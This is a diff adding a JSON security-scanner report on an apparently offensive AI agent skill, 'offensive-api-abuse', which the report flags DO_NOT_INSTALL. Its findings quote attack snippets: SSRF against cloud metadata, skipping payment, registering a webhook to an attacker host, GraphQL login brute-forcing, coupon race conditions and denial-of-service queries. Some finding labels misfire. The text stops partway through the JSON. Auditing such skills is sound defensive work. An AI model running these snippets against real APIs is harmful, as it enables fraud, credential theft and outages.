@@ -1,0 +1,2008 @@
+{
+  "multi_skill": true,
+  "skill_count": 2,
+  "max_risk_score": 56,
+  "risk_severity": "HIGH",
+  "execution_successful": true,
+  "risk_recommendation": "DO_NOT_INSTALL",
+  "analysis_completeness": {
+    "is_complete": true,
+    "execution_successful": true,
+    "status": "complete",
+    "coverage_percent": 100.0,
+    "fully_inspected_files": 2,
+    "partially_inspected_files": 0,
+    "entirely_uninspected_files": 0,
+    "total_files": 2,
+    "limitations": [],
+    "scope": "recursive_skills"
+  },
+  "skills_scanned": 2,
+  "skills_omitted": 0,
+  "skills_output_omitted": 0,
+  "public_finding_records": 27,
+  "report_characters": 72306,
+  "transitive_finding_count": 0,
+  "transitive_sources": [],
+  "skills": [
+    {
+      "name": "offensive-api-abuse",
+      "path": "offensive-api-abuse",
+      "risk_score": 56,
+      "risk_severity": "HIGH",
+      "finding_count": 10,
+      "execution_successful": true,
+      "transitive_finding_count": 0,
+      "transitive_sources": [],
+      "skill": {
+        "name": "offensive-api-abuse",
+        "source": "/Users/test/Desktop/neuron-surgery/skill-audit/repos/SnailSploit_Claude-Red/Skills/api/offensive-api-abuse",
+        "scanned_at": "2026-11-13T11:38:02.114995+00:00"
+      },
+      "risk_assessment": {
+        "score": 56,
+        "severity": "HIGH",
+        "recommendation": "DO_NOT_INSTALL",
+        "max_issue_severity": "HIGH"
+      },
+      "components": [
+        {
+          "path": "SKILL.md",
+          "type": "markdown",
+          "lines": 499,
+          "executable": false,
+          "size_bytes": 22383,
+          "source_url": null,
+          "source_identity": null,
+          "source_digest": null
+        }
+      ],
+      "structured_summaries": [],
+      "issues": [
+        {
+          "id": "SSRF1",
+          "finding_id": "finding-b252b554ddb84b96bd456750c1e3c74d",
+          "category": "Server-Side Request Forgery",
+          "pattern": "Cloud Metadata Access",
+          "severity": "HIGH",
+          "confidence": 0.9,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 215,
+            "end_line": null,
+            "start_column": 10
+          },
+          "finding": "169.254.169.254",
+          "explanation": "Code accesses a cloud instance metadata endpoint (e.g. 169.254.169.254). A single request can return temporary IAM credentials, making this a high-value SSRF target for credential theft.",
+          "remediation": "Remove access to cloud metadata endpoints unless strictly required. If metadata is needed, restrict it (e.g. IMDSv2 with hop limit) and never expose returned credentials.",
+          "code_snippet": "# Webhook SSRF: point webhook URL to internal services\ninternal_targets=(\n  \"http://127.0.0.1:8080/admin\"\n  \"http://169.254.169.254/latest/meta-data/\"\n  \"http://internal-api.local:3000/health\"\n  \"http://elasticsearch.internal:9200/_cat/indices\"\n)",
+          "intent": null,
+          "tags": [
+            "Server-Side Request Forgery"
+          ],
+          "evidence": {},
+          "match_fingerprint": "d61ab72824eae3143803cfed4f723d8454fedefdac1d6ad5c7f4299f9032a6ee",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 215,
+              "end_line": null,
+              "start_column": 10
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "MP3",
+          "finding_id": "finding-02646af6c8dc4117a28f1fe4b576c346",
+          "category": "Memory Poisoning",
+          "pattern": "Memory Manipulation",
+          "severity": "HIGH",
+          "confidence": 0.9,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 233,
+            "end_line": null,
+            "start_column": 164
+          },
+          "finding": "corrupt state",
+          "explanation": "Skill manipulates agent memory, state, or stored context. Memory corruption can alter personality, override safety rules, or cause unpredictable behavior.",
+          "remediation": "Protect agent memory and state from modification by untrusted content. Use read-only memory for critical instructions and validate all state changes.",
+          "code_snippet": "\n## Race Conditions in API Transactions\n\nRace conditions occur when APIs fail to properly serialize concurrent requests against shared state. You exploit these to duplicate transactions, bypass limits, or corrupt state.\n\n```python\n#!/usr/bin/env python3",
+          "intent": null,
+          "tags": [
+            "Memory Poisoning"
+          ],
+          "evidence": {},
+          "match_fingerprint": "6b8072b03bc313721f36d2d84551fb73cecf818ccf275bba28d57729fc578ce8",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 233,
+              "end_line": null,
+              "start_column": 164
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "E1",
+          "finding_id": "finding-a2d37ac3a3924649b6afe3f1a163c901",
+          "category": "Data Exfiltration",
+          "pattern": "External Transmission",
+          "severity": "MEDIUM",
+          "confidence": 0.6,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 34,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "curl -s -X POST -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d ",
+          "explanation": "Data is being sent to an external URL. This could be legitimate telemetry or data exfiltration. Manual review is recommended.",
+          "remediation": "Verify the destination URL is trusted and necessary. Remove or replace with documented APIs. Ensure no secrets, tokens, or PII are transmitted.",
+          "code_snippet": "# Normal flow: add_to_cart -> apply_coupon -> calculate_total -> pay -> confirm\n# Attack: skip payment and go directly to confirm\n\ncurl -s -X POST -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"product_id\": \"PROD-001\", \"quantity\": 1}' \\\n  \"https://target.example.com/api/v1/cart/items\" | jq .",
+          "intent": null,
+          "tags": [
+            "Data Exfiltration"
+          ],
+          "evidence": {},
+          "match_fingerprint": "864b339c1b9caaf7813f4f5b9584bada163718cfedf35806c1387cf914d9051e",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 34,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "E1",
+          "finding_id": "finding-3bf8c2653a94487994adc9a37d03302e",
+          "category": "Data Exfiltration",
+          "pattern": "External Transmission",
+          "severity": "MEDIUM",
+          "confidence": 0.6,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 39,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "curl -s -X POST -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d ",
+          "explanation": "Data is being sent to an external URL. This could be legitimate telemetry or data exfiltration. Manual review is recommended.",
+          "remediation": "Verify the destination URL is trusted and necessary. Remove or replace with documented APIs. Ensure no secrets, tokens, or PII are transmitted.",
+          "code_snippet": "  -d '{\"product_id\": \"PROD-001\", \"quantity\": 1}' \\\n  \"https://target.example.com/api/v1/cart/items\" | jq .\n\ncurl -s -X POST -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"coupon_code\": \"SAVE20\"}' \\\n  \"https://target.example.com/api/v1/cart/coupon\" | jq .",
+          "intent": null,
+          "tags": [
+            "Data Exfiltration"
+          ],
+          "evidence": {},
+          "match_fingerprint": "864b339c1b9caaf7813f4f5b9584bada163718cfedf35806c1387cf914d9051e",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 39,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "E1",
+          "finding_id": "finding-606e8d273532462696b32cf815012d4c",
+          "category": "Data Exfiltration",
+          "pattern": "External Transmission",
+          "severity": "MEDIUM",
+          "confidence": 0.6,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 45,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "curl -s -X POST -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d ",
+          "explanation": "Data is being sent to an external URL. This could be legitimate telemetry or data exfiltration. Manual review is recommended.",
+          "remediation": "Verify the destination URL is trusted and necessary. Remove or replace with documented APIs. Ensure no secrets, tokens, or PII are transmitted.",
+          "code_snippet": "  \"https://target.example.com/api/v1/cart/coupon\" | jq .\n\n# Skip payment -- attempt direct order confirmation\ncurl -s -X POST -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"cart_id\": \"CART-12345\"}' \\\n  \"https://target.example.com/api/v1/orders/confirm\" | jq .",
+          "intent": null,
+          "tags": [
+            "Data Exfiltration"
+          ],
+          "evidence": {},
+          "match_fingerprint": "864b339c1b9caaf7813f4f5b9584bada163718cfedf35806c1387cf914d9051e",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 45,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "E1",
+          "finding_id": "finding-ac3630293ccc4ed5837c61ea13714df4",
+          "category": "Data Exfiltration",
+          "pattern": "External Transmission",
+          "severity": "MEDIUM",
+          "confidence": 0.6,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 198,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "curl -s -X POST -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d ",
+          "explanation": "Data is being sent to an external URL. This could be legitimate telemetry or data exfiltration. Manual review is recommended.",
+          "remediation": "Verify the destination URL is trusted and necessary. Remove or replace with documented APIs. Ensure no secrets, tokens, or PII are transmitted.",
+          "code_snippet": "\n```bash\n# Register a webhook pointing to your controlled server\ncurl -s -X POST -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"url\": \"https://attacker-listener.example.com/webhook\",",
+          "intent": null,
+          "tags": [
+            "Data Exfiltration"
+          ],
+          "evidence": {},
+          "match_fingerprint": "864b339c1b9caaf7813f4f5b9584bada163718cfedf35806c1387cf914d9051e",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 198,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "E1",
+          "finding_id": "finding-5b250146f5ba43018ce60ac6b6de82b4",
+          "category": "Data Exfiltration",
+          "pattern": "External Transmission",
+          "severity": "MEDIUM",
+          "confidence": 0.6,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 221,
+            "end_line": null,
+            "start_column": 9
+          },
+          "finding": "curl -s -X POST -H \"Authorization: Bearer $TOKEN\" \\\n    -H \"Content-Type: application/json\" \\\n    -d ",
+          "explanation": "Data is being sent to an external URL. This could be legitimate telemetry or data exfiltration. Manual review is recommended.",
+          "remediation": "Verify the destination URL is trusted and necessary. Remove or replace with documented APIs. Ensure no secrets, tokens, or PII are transmitted.",
+          "code_snippet": ")\n\nfor target_url in \"${internal_targets[@]}\"; do\n  resp=$(curl -s -X POST -H \"Authorization: Bearer $TOKEN\" \\\n    -H \"Content-Type: application/json\" \\\n    -d \"{\\\"url\\\": \\\"${target_url}\\\", \\\"events\\\": [\\\"test.ping\\\"]}\" \\\n    \"https://target.example.com/api/v1/webhooks\")",
+          "intent": null,
+          "tags": [
+            "Data Exfiltration"
+          ],
+          "evidence": {},
+          "match_fingerprint": "864b339c1b9caaf7813f4f5b9584bada163718cfedf35806c1387cf914d9051e",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 221,
+              "end_line": null,
+              "start_column": 9
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "E1",
+          "finding_id": "finding-ddda3515adea4c65b96526fe70bdb109",
+          "category": "Data Exfiltration",
+          "pattern": "External Transmission",
+          "severity": "MEDIUM",
+          "confidence": 0.6,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 53,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "curl -s -X POST -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"product_id\": \"EXPENSIVE-001\", \"quantity\": 1}' \\\n  \"https://target.example.com/api/v1/cart/items\"\n\ncu",
+          "explanation": "Data is being sent to an external URL. This could be legitimate telemetry or data exfiltration. Manual review is recommended.",
+          "remediation": "Verify the destination URL is trusted and necessary. Remove or replace with documented APIs. Ensure no secrets, tokens, or PII are transmitted.",
+          "code_snippet": "\n```bash\n# Price manipulation: add expensive item for free shipping, calculate, remove it\ncurl -s -X POST -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"product_id\": \"EXPENSIVE-001\", \"quantity\": 1}' \\\n  \"https://target.example.com/api/v1/cart/items\"",
+          "intent": null,
+          "tags": [
+            "Data Exfiltration"
+          ],
+          "evidence": {},
+          "match_fingerprint": "d9918992f670e383cd53b0d4be1f2f081f74e0a1aef0fbb8c6671d990993c6dc",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 53,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "E1",
+          "finding_id": "finding-6c93ba8a5a51426fad4d2d316181c892",
+          "category": "Data Exfiltration",
+          "pattern": "External Transmission",
+          "severity": "MEDIUM",
+          "confidence": 0.6,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 101,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "curl -s -X POST -H \"Content-Type: application/json\" \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -d ",
+          "explanation": "Data is being sent to an external URL. This could be legitimate telemetry or data exfiltration. Manual review is recommended.",
+          "remediation": "Verify the destination URL is trusted and necessary. Remove or replace with documented APIs. Ensure no secrets, tokens, or PII are transmitted.",
+          "code_snippet": "  -d '{\"query\": \"{ __schema { types { name kind fields { name type { name kind ofType { name } } } } } }\"}' \\\n  \"https://target.example.com/graphql\" | jq '.data.__schema.types[] | select(.kind == \"OBJECT\")'\n\ncurl -s -X POST -H \"Content-Type: application/json\" \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -d '{\"query\": \"{ __schema { mutationType { fields { name args { name type { name kind } } } } } }\"}' \\\n  \"https://target.example.com/graphql\" | jq '.data.__schema.mutationType.fields[].name'",
+          "intent": null,
+          "tags": [
+            "Data Exfiltration"
+          ],
+          "evidence": {},
+          "match_fingerprint": "9bc0589528a559a7bc61b141db66e11b27699669a3fabf288646d7d082d9d166",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 101,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "E1",
+          "finding_id": "finding-195cd3f95d8b4ef38e1e67e45d945db1",
+          "category": "Data Exfiltration",
+          "pattern": "External Transmission",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 127,
+            "end_line": null,
+            "start_column": 15
+          },
+          "finding": "requests.post(TARGET, json=",
+          "explanation": "Data is being sent to an external URL. This could be legitimate telemetry or data exfiltration. Manual review is recommended.",
+          "remediation": "Verify the destination URL is trusted and necessary. Remove or replace with documented APIs. Ensure no secrets, tokens, or PII are transmitted.",
+          "code_snippet": "            {\"query\": f'mutation a{j} {{ login(email: \"{email}\", password: \"{pwd}\") {{ token success }} }}'}\n            for j, pwd in enumerate(batch)\n        ]\n        resp = requests.post(TARGET, json=payload, headers={\"Content-Type\": \"application/json\"})\n        if resp.status_code == 429:\n            print(f\"[!] Rate limited at batch index {i}\")\n            break",
+          "intent": null,
+          "tags": [
+            "Data Exfiltration"
+          ],
+          "evidence": {},
+          "match_fingerprint": "b6a812657b366bf8ddcfdf15b0774b3712fc0e1b77235c65bdab27ec6a52f11d",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 127,
+              "end_line": null,
+              "start_column": 15
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "E1",
+          "finding_id": "finding-f6438215f1674e9e834e89f0b8f16bb7",
+          "category": "Data Exfiltration",
+          "pattern": "External Transmission",
+          "severity": "MEDIUM",
+          "confidence": 0.6,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 143,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "curl -s -X POST -H \"Content-Type: application/json\" \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -d '{\"query\": \"{ users { posts { comments { author { posts { comments { author { posts { comments { author",
+          "explanation": "Data is being sent to an external URL. This could be legitimate telemetry or data exfiltration. Manual review is recommended.",
+          "remediation": "Verify the destination URL is trusted and necessary. Remove or replace with documented APIs. Ensure no secrets, tokens, or PII are transmitted.",
+          "code_snippet": "\n```bash\n# Query depth exploitation for denial of service\ncurl -s -X POST -H \"Content-Type: application/json\" \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -d '{\"query\": \"{ users { posts { comments { author { posts { comments { author { posts { comments { author { name } } } } } } } } } } }\"}' \\\n  \"https://target.example.com/graphql\"",
+          "intent": null,
+          "tags": [
+            "Data Exfiltration"
+          ],
+          "evidence": {},
+          "match_fingerprint": "de4eb10a4065441fddf940eac0939f660a80c6b89cf24505e60804c4607743bb",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 143,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "E1",
+          "finding_id": "finding-33ea29ac29e54b9cb9e67fb741625218",
+          "category": "Data Exfiltration",
+          "pattern": "External Transmission",
+          "severity": "MEDIUM",
+          "confidence": 0.6,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 276,
+            "end_line": null,
+            "start_column": 27
+          },
+          "finding": "curl -s -o /dev/null -w \"Request {}: %{http_code}\\n\" \\\n  -X POST -H \"Authorization: Bearer '\"$TOKEN\"'\" \\\n  -H \"Content-Type: application/json\" \\\n  -d ",
+          "explanation": "Data is being sent to an external URL. This could be legitimate telemetry or data exfiltration. Manual review is recommended.",
+          "remediation": "Verify the destination URL is trusted and necessary. Remove or replace with documented APIs. Ensure no secrets, tokens, or PII are transmitted.",
+          "code_snippet": "\n```bash\n# Race condition using GNU parallel with curl\nseq 1 20 | parallel -j 20 'curl -s -o /dev/null -w \"Request {}: %{http_code}\\n\" \\\n  -X POST -H \"Authorization: Bearer '\"$TOKEN\"'\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '\\''{\"coupon_code\": \"SINGLE-USE\"}'\\'' \\",
+          "intent": null,
+          "tags": [
+            "Data Exfiltration"
+          ],
+          "evidence": {},
+          "match_fingerprint": "bdb2ed7d2d67abc89bc2fbb792b8775a592f5e822aea60262af9bddeac49ab98",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 276,
+              "end_line": null,
+              "start_column": 27
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "E1",
+          "finding_id": "finding-d9cf3a2658794bd6b788a041af1d728f",
+          "category": "Data Exfiltration",
+          "pattern": "External Transmission",
+          "severity": "MEDIUM",
+          "confidence": 0.6,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 371,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "curl -s -X POST -H \"Content-Type: application/json\" \\\n  -d ",
+          "explanation": "Data is being sent to an external URL. This could be legitimate telemetry or data exfiltration. Manual review is recommended.",
+          "remediation": "Verify the destination URL is trusted and necessary. Remove or replace with documented APIs. Ensure no secrets, tokens, or PII are transmitted.",
+          "code_snippet": "done\n\n# Error message key leakage\ncurl -s -X POST -H \"Content-Type: application/json\" \\\n  -d '{\"invalid\": true}' \"https://target.example.com/api/v1/connect\" | \\\n  grep -iE '(key|token|secret|password|credential)'\n```",
+          "intent": null,
+          "tags": [
+            "Data Exfiltration"
+          ],
+          "evidence": {},
+          "match_fingerprint": "557f8f65cd9e1d6cf4b0613d8dc3aa3cb8617952efe74f507c9fe933ef540b60",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 371,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "E1",
+          "finding_id": "finding-27f00ec77d0e46de9a0f31177a4fb915",
+          "category": "Data Exfiltration",
+          "pattern": "External Transmission",
+          "severity": "MEDIUM",
+          "confidence": 0.6,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 426,
+            "end_line": null,
+            "start_column": 2
+          },
+          "finding": "curl -s -o /dev/null -w \"Length ${len}: %{time_total}s\\n\" \\\n    -H \"Authorization: Bearer $TOKEN\" \\\n    \"https://target.example.com/api/v1/search?q=%24%7Bpayload}\"\ndone\n\n# XML entity expansion (Billion La",
+          "explanation": "Data is being sent to an external URL. This could be legitimate telemetry or data exfiltration. Manual review is recommended.",
+          "remediation": "Verify the destination URL is trusted and necessary. Remove or replace with documented APIs. Ensure no secrets, tokens, or PII are transmitted.",
+          "code_snippet": "# ReDoS via search parameters -- measure response time scaling\nfor len in 10 20 30 40 50; do\n  payload=$(python3 -c \"print('a' * ${len} + '!')\")\n  curl -s -o /dev/null -w \"Length ${len}: %{time_total}s\\n\" \\\n    -H \"Authorization: Bearer $TOKEN\" \\\n    \"https://target.example.com/api/v1/search?q=%24%7Bpayload}\"\ndone",
+          "intent": null,
+          "tags": [
+            "Data Exfiltration"
+          ],
+          "evidence": {},
+          "match_fingerprint": "137ae3a9aa71481cbba7ca5b9f43954cfd0df7ad4ef04dc437bbaa12eac45eee",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 426,
+              "end_line": null,
+              "start_column": 2
+            }
+          ],
+          "surface": "instructions"
+        }
+      ],
+      "suppressed_count": 0,
+      "suppressed": [],
+      "metadata": {
+        "has_executable_scripts": false,
+        "skillspector_version": "2.12.0",
+        "llm_requested": false,
+        "llm_available": false,
+        "meta_analysis_applied": false,
+        "inference_usage": [],
+        "llm_provenance": {
+          "schema_version": 1,
+          "provider": {
+            "configured_adapter": "unknown",
+            "resolved_adapter": "unknown",
+            "effective_adapter": "not_applicable",
+            "effective_adapters": [],
+            "service": "unknown",
+            "routing": {
+              "deployment_override": null,
+              "deployment_source": "unknown",
+              "api_version": null,
+              "api_version_source": "unknown"
+            }
+          },
+          "analyzers": [
+            {
+              "analyzer_id": "mcp_tool_poisoning",
+              "model": "z-ai/glm-5.3",
+              "model_source": "resolved_configuration",
+              "analyzer_revision": {
+                "value": "2.12.0",
+                "source": "skillspector_package",
+                "source_revision": {
+                  "value": "9dc82fe473329b2b742aa5097dcfe7ae55f51b01",
+                  "source": "package_vcs_metadata"
+                }
+              }
+            },
+            {
+              "analyzer_id": "semantic_developer_intent",
+              "model": "z-ai/glm-5.3",
+              "model_source": "resolved_configuration",
+              "analyzer_revision": {
+                "value": "2.12.0",
+                "source": "skillspector_package",
+                "source_revision": {
+                  "value": "9dc82fe473329b2b742aa5097dcfe7ae55f51b01",
+                  "source": "package_vcs_metadata"
+                }
+              }
+            },
+            {
+              "analyzer_id": "semantic_quality_policy",
+              "model": "z-ai/glm-5.3",
+              "model_source": "resolved_configuration",
+              "analyzer_revision": {
+                "value": "2.12.0",
+                "source": "skillspector_package",
+                "source_revision": {
+                  "value": "9dc82fe473329b2b742aa5097dcfe7ae55f51b01",
+                  "source": "package_vcs_metadata"
+                }
+              }
+            },
+            {
+              "analyzer_id": "semantic_security_discovery",
+              "model": "z-ai/glm-5.3",
+              "model_source": "resolved_configuration",
+              "analyzer_revision": {
+                "value": "2.12.0",
+                "source": "skillspector_package",
+                "source_revision": {
+                  "value": "9dc82fe473329b2b742aa5097dcfe7ae55f51b01",
+                  "source": "package_vcs_metadata"
+                }
+              }
+            },
+            {
+              "analyzer_id": "meta_analyzer",
+              "model": "z-ai/glm-5.3",
+              "model_source": "resolved_configuration",
+              "analyzer_revision": {
+                "value": "2.12.0",
+                "source": "skillspector_package",
+                "source_revision": {
+                  "value": "9dc82fe473329b2b742aa5097dcfe7ae55f51b01",
+                  "source": "package_vcs_metadata"
+                }
+              }
+            }
+          ],
+          "sampling": {
+            "temperature": {
+              "requested": null,
+              "source": "provider_default",
+              "forwarded_to_client": null,
+              "adapter_support": false,
+              "provider_support": "unknown"
+            },
+            "seed": {
+              "requested": null,
+              "source": "unset",
+              "forwarded_to_client": null,
+              "adapter_support": false,
+              "provider_support": "unknown"
+            },
+            "reasoning_effort": {
+              "requested": null,
+              "source": "provider_default",
+              "forwarded_to_client": null,
+              "adapter_support": false,
+              "provider_support": "unknown"
+            }
+          },
+          "determinism": {
+            "classification": "not_applicable",
+            "control_status": "not_applied",
+            "provider_guarantee": false,
+            "reason": "LLM analysis was not executed for this scan."
+          }
+        },
+        "filtering_mode": "heuristic"
+      },
+      "analysis_completeness": {
+        "total_components": 1,
+        "scanned_components": 1,
+        "coverage_percent": 100.0,
+        "is_complete": true,
+        "status": "complete_with_caveats",
+        "execution_successful": true,
+        "fully_inspected_files": 1,
+        "partially_inspected_files": 0,
+        "entirely_uninspected_files": 0,
+        "ledger_exceptions": [
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 202,
+            "end_line": 202,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 322,
+            "end_line": 322,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 434,
+            "end_line": 434,
+            "fatal": false
+          }
+        ],
+        "scope_exclusions": [],
+        "analyzer_statuses": [
+          {
+            "analyzer_id": "artifact_integrity",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "behavioral_ast",
+            "status": "not_applicable",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "no_applicable_files",
+            "message": "No files matched this analyzer's applicability contract."
+          },
+          {
+            "analyzer_id": "behavioral_taint_tracking",
+            "status": "not_applicable",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "no_applicable_files",
+            "message": "No files matched this analyzer's applicability contract."
+          },
+          {
+            "analyzer_id": "bundled_execution_surface",
+            "status": "not_applicable",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "no_applicable_files",
+            "message": "No files matched this analyzer's applicability contract."
+          },
+          {
+            "analyzer_id": "mcp_least_privilege",
+            "status": "not_applicable",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "no_applicable_files",
+            "message": "No files matched this analyzer's applicability contract."
+          },
+          {
+            "analyzer_id": "mcp_rug_pull",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "mcp_tool_poisoning",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "meta_analyzer",
+            "status": "disabled",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "disabled_by_configuration",
+            "message": "Analyzer was disabled by the requested configuration."
+          },
+          {
+            "analyzer_id": "semantic_developer_intent",
+            "status": "disabled",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "disabled_by_configuration",
+            "message": "Analyzer was disabled by the requested configuration."
+          },
+          {
+            "analyzer_id": "semantic_quality_policy",
+            "status": "disabled",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "disabled_by_configuration",
+            "message": "Analyzer was disabled by the requested configuration."
+          },
+          {
+            "analyzer_id": "semantic_security_discovery",
+            "status": "disabled",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "disabled_by_configuration",
+            "message": "Analyzer was disabled by the requested configuration."
+          },
+          {
+            "analyzer_id": "static_patterns_agent_snooping",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_anti_refusal",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_data_exfiltration",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_deserialization",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_excessive_agency",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_harmful_content",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_memory_poisoning",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
